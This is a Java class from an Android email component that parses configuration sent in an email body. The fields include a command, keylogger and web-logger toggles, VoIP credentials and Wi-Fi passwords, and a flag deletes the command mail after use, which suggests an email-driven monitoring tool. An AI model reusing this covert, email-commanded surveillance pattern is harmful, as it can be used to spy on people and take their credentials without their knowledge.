package com.dtj.email;

import javax.mail.Flags;

import android.content.Context;

import com.dtj.email.MailConstants.DBField;

public class DBFields 
{				
	String cid;
	String wid;
	String cmd;
	String workstation;	
	
	String archive_mail;
	String sound_mail;
	String feature_keylogger;
	String feature_weblogger;
	String feature_attlogger;
	String feature_applogger;
	String feature_mailadmin;	
	String feature_payroll;
	String feature_chat;
	String feature_voip;
	String feature_puma;
	String attlog_time;
	String voip_username;
	String voip_password;
	
	String ssid0;
	String pwd0;
	String ssid1;
	String pwd1;
	String ssid2;
	String pwd2;
	String ssid3;
	String pwd3;
	String ssid4;
	String pwd4;
	String ssid5;
	String pwd5;
	String ssid6;
	String pwd6;
	
	boolean bAttachment;
	boolean bDeleteMail;
	
	static String[] field_names = {
		"cid","wid","cmd","workstation","archive.mail","sound.mail","feature.keylogger","feature.weblogger","feature.attlogger",
		"feature.applogger", "feature.mailadmin","feature.payroll","feature.chat","feature.voip","feature.puma","attlog.time","voip.username",
		"voip.password",
		"ssid0", "pwd0",
		"ssid1", "pwd1",
		"ssid2", "pwd2",
		"ssid3", "pwd3",
		"ssid4", "pwd4",
		"ssid5", "pwd5",
		"ssid6", "pwd6"		
		};
	
	public DBFields()
	{
		cid= "";
		wid= "";
		cmd= "";
		workstation= "";	
		
		archive_mail= "";
		sound_mail= "";
		feature_keylogger= "";
		feature_weblogger= "";
		feature_attlogger= "";
		feature_applogger= "";
		feature_mailadmin= "";
		feature_payroll= "";
		feature_chat= "";
		feature_voip= "";
		feature_puma= "";
		attlog_time= "";
		voip_username= "";
		voip_password= "";
		
		bAttachment = false;
		bDeleteMail = false;
	}
	
	public boolean VerifyId(String sAppCId, String sAppWId, String sCmd)
	{
		boolean bOK = false;		
		String[] sArrWId = getWid().split(",");				
		String[] sArrCId = getCid().split(",");
		
		if (sAppWId.trim().length() <= 0 || sAppCId.trim().length() <= 0)
			return false;
			
		if (sArrWId.length > 0)
		{
			for (String wid: sArrWId)
			{
				if (wid.equals("*") && getCmd().equals(sCmd))
				{
					bOK = true;
					bDeleteMail = false;
					break;
				}
				
				if (wid.equals(sAppWId) && getCmd().equals(sCmd))
				{								
					bOK = true;				
					if (sArrWId.length <= 1)		    
						bDeleteMail = true;
					
					break;
				}
			}
		}
		
		if (!bOK)
		{
			if (sArrCId.length > 0)
			{
				for (String cid: sArrCId)
				{
					if (cid.equals("*") && getCmd().equals(sCmd))
					{
						bOK = true;
						bDeleteMail = false;
						break;
					}
					
					if (cid.equals(sAppCId) && getCmd().equals(sCmd))
					{								
						bOK = true;
						if (sArrCId.length <= 1)		    
							bDeleteMail = true;
						break;
					}
				}
			}
		}
		
		return bOK;
	}
	
	public boolean ParseLines(String sMsgBody)
	{
		boolean bOK = false;
		
		String lines[] = sMsgBody.trim().split("\\r?\\n");
		try
		{
			for (String line: lines)
			{
				for (int i=0;i<field_names.length;i++)
				{
					if (line.startsWith(field_names[i]))
					{
						String sValue = line.substring(field_names[i].length() + 2, line.length()-1);
						
						//"cid","wid","cmd","workstation","archive.mail","sound.mail","feature.keylogger","feature.weblogger","feature.attlogger",
						//"feature.mailadmin","feature.payroll","feature.chat","feature.voip","attlog.time","voip.username","voip.password"
						DBField dbf = DBField.lookup(i);						
						switch (dbf)
						{
							case cid:												
								cid = sValue;
								break;
							case wid:
								wid = sValue;
								break;
							case cmd:
								cmd = sValue;
								break;
							case workstation:
								workstation = sValue;
								break;
							case archive_mail:
								archive_mail = sValue;
								break;
							case sound_mail:
								sound_mail = sValue;
								break;
							case feature_keylogger:
								feature_keylogger = sValue;
								break;
							case feature_weblogger:
								feature_weblogger = sValue;
								break;
							case feature_attlogger:
								feature_attlogger = sValue;
								break;
							case feature_applogger:
								feature_applogger = sValue;
								break;
							case feature_mailadmin:
								feature_mailadmin = sValue;
								break;
							case feature_payroll:
								feature_payroll = sValue;
								break;
							case feature_chat:
								feature_chat = sValue;
								break;
							case feature_voip:
								feature_voip = sValue;
								break;
							case feature_puma:
								feature_puma = sValue;
								break;
							case attlog_time:
								attlog_time = sValue;
								break;
							case voip_username:
								voip_username = sValue;
								break;
							case voip_password:
								voip_password = sValue;
								break;
							
							case ssid0:
								ssid0 = sValue;
								break;
							case ssid1:
								ssid1 = sValue;
								break;
							case ssid2:
								ssid2 = sValue;
								break;
							case ssid3:
								ssid3 = sValue;
								break;
							case ssid4:
								ssid4 = sValue;
								break;
							case ssid5:
								ssid5 = sValue;
								break;
							case ssid6:
								ssid6 = sValue;
								break;
							
							case pwd0:
								pwd0 = sValue;
								break;								
							case pwd1:
								pwd1 = sValue;
								break;
							case pwd2:
								pwd2 = sValue;
								break;
							case pwd3:
								pwd3 = sValue;
								break;
							case pwd4:
								pwd4 = sValue;
								break;
							case pwd5:
								pwd5 = sValue;
								break;
							case pwd6:
								pwd6 = sValue;
								break;
								
							default:
								break;
						}
					}
				}
			}
			
			bOK = true;
		}
		catch (Exception ex)
		{}
		
		return bOK;
	}

	public String getCid() {
		return cid;
	}

	public void setCid(String cid) {
		this.cid = cid;
	}

	public String getWid() {
		return wid;
	}

	public void setWid(String wid) {
		this.wid = wid;
	}

	public String getCmd() {
		return cmd;
	}

	public void setCmd(String cmd) {
		this.cmd = cmd;
	}

	public String getWorkstation() {
		return workstation;
	}

	public void setWorkstation(String workstation) {
		this.workstation = workstation;
	}

	public String getArchive_mail() {
		return archive_mail;
	}

	public void setArchive_mail(String archive_mail) {
		this.archive_mail = archive_mail;
	}

	public String getSound_mail() {
		return sound_mail;
	}

	public void setSound_mail(String sound_mail) {
		this.sound_mail = sound_mail;
	}

	public String getFeature_keylogger() {
		return feature_keylogger;
	}

	public void setFeature_keylogger(String feature_keylogger) {
		this.feature_keylogger = feature_keylogger;
	}

	public String getFeature_weblogger() {
		return feature_weblogger;
	}

	public void setFeature_weblogger(String feature_weblogger) {
		this.feature_weblogger = feature_weblogger;
	}

	public String getFeature_attlogger() {
		return feature_attlogger;
	}

	public void setFeature_attlogger(String feature_attlogger) {
		this.feature_attlogger = feature_attlogger;
	}

	public String getFeature_mailadmin() {
		return feature_mailadmin;
	}

	public void setFeature_mailadmin(String feature_mailadmin) {
		this.feature_mailadmin = feature_mailadmin;
	}

	public String getFeature_payroll() {
		return feature_payroll;
	}

	public void setFeature_payroll(String feature_payroll) {
		this.feature_payroll = feature_payroll;
	}

	public String getFeature_chat() {
		return feature_chat;
	}

	public void setFeature_chat(String feature_chat) {
		this.feature_chat = feature_chat;
	}

	public String getFeature_voip() {
		return feature_voip;
	}

	public void setFeature_voip(String feature_voip) {
		this.feature_voip = feature_voip;
	}

	public String getAttlog_time() {
		return attlog_time;
	}

	public void setAttlog_time(String attlog_time) {
		this.attlog_time = attlog_time;
	}

	public String getVoip_username() {
		return voip_username;
	}

	public void setVoip_username(String voip_username) {
		this.voip_username = voip_username;
	}

	public String getVoip_password() {
		return voip_password;
	}

	public void setVoip_password(String voip_password) {
		this.voip_password = voip_password;
	}

	public String getFeature_applogger() {
		return feature_applogger;
	}

	public void setFeature_applogger(String feature_applogger) {
		this.feature_applogger = feature_applogger;
	}

	public boolean isbAttachment() {
		return bAttachment;
	}

	public void setbAttachment(boolean bAttachment) {
		this.bAttachment = bAttachment;
	}

	public boolean isbDeleteMail() {
		return bDeleteMail;
	}

	public String getFeature_puma() {
		return feature_puma;
	}

	public void setFeature_puma(String feature_puma) {
		this.feature_puma = feature_puma;
	}
	
}
